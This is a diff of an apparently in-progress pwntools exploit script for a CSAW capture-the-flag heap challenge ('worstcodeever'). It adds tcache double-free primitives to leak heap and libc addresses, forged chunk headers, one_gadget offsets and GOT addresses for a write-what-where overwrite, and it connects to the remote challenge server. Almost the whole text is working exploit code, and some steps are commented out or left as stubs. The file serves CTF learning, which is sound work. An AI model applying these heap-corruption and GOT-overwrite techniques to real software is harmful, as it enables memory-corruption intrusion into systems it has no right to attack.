@@ -2,6 +2,12 @@
 
 from pwn import *
 
+exe = ELF("./worstcodeever")
+libc = ELF("./libc-2.27.so")
+ld = ELF("./ld-2.27.so")
+
+context.binary = exe
+
 """ Notes
 sizeof(struct Friend) == 16
 sizeof(union identifier) == 8
@@ -74,17 +80,24 @@ def edit(index, newname_or_newbarcode, newage):
     print(str(newage).encode()+b'\n')
     conn.sendline(str(newage).encode())
 
-def show(index):
+def show(index,kind='robot'):
     print(conn.recvuntil(b'> ').decode())
     print(b'3\n')
     conn.sendline(b'3')
     print(conn.recvuntil(b'\n').decode())
     print(str(index).encode()+b'\n')
     conn.sendline(str(index).encode())
+    name = conn.recvline().split()[-1]
+    if kind=='robot':
+        print(kind)
+        name = int(name)
     print(conn.recvuntil(b'age: ').decode()+conn.recvuntil(b'\n').decode())
+    return name
 
 if args.GDB:
-    conn = gdb.debug('./worstcodeever', gdbscript=(''
+    conn = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
+    g = gdb.attach(conn, gdbscript=(''
+         +'file worstcodeever\n'
          +'break display\n'
          +'commands\n'
          +'heap bins\n'#unfortunately this shows up before gef context
@@ -97,7 +110,7 @@ if args.GDB:
         )
     )
 elif args.LOCAL:
-    conn = process('./worstcodeever')
+    conn = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
 else:
     conn = remote('pwn.red.csaw.io',5008)
 
@@ -122,19 +135,45 @@ def writewhatwhere(where, what):
     addrobot(what,500)#create another robot; it will be at `where`; set its barcode to `what`
     #you have written `what` to `where`
 
-def leak():
-    addrobot(999,100)#create an unwanted robot (to avoid "too few friends")
+def leak_heap_addr():
+    addfriend(b'999',b'tony',128)#create an unwanted friend (to avoid "too few friends")
     addrobot(101,200)#create a robot
     show(1)
     free(1) #double free the robot
     free(1)
+    heap_addr = show(1)
+    print("Heap addr:",hex(heap_addr))
+    return heap_addr
+
+def leak_libc():
+    free(1)
+    free(1)
+    addrobot(0,333)
+    addrobot(333,321)
+    fake_chunk = (p64(heap_addr)+p64(0x91))*3
+    addfriend(b'1',fake_chunk,64)
+    for i in range(8):
+        pass
+
+def teamrocket():
+    addfriend(b'2',b'unwanted',2)
+    addfriend(b'1',b'A'*0x29+p64(0)+p64(0x51),4)
     show(1)
-    
+    free(1)
+    free(1)
+    leak = show(1, kind='human')
+    print('leak:',leak)
+
+one_gadgets = [0x4f365,0x4f3c2,0x10a45c]
 puts_gotplt = 0x00602020
+free_gotplt = 0x00602018
 play = 0x00400db8
 
-leak()
-#writewhatwhere(puts_gotplt,play)
+#heap_addr = leak_heap_addr()
+#libc_addr = leak_libc()
+#writewhatwhere(heap_addr,u64(b'AAAABBBB'))
+#writewhatwhere(free_gotplt,play)
+teamrocket()
 conn.interactive()
 
 conn.close()
